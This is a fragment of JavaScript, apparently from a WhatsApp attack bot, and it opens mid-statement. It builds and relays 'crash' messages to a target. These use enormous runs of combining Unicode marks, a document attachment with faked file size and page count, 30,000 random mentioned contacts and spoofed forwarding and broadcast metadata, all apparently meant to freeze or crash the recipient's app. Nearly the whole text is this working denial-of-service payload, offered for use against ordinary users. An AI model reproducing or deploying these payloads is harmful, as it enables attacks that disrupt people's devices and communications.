̷⃨ۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗ⃛'.repeat(5);

  await conn.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '[🎁] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function Raldz5(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "[💣] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n." + "꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨ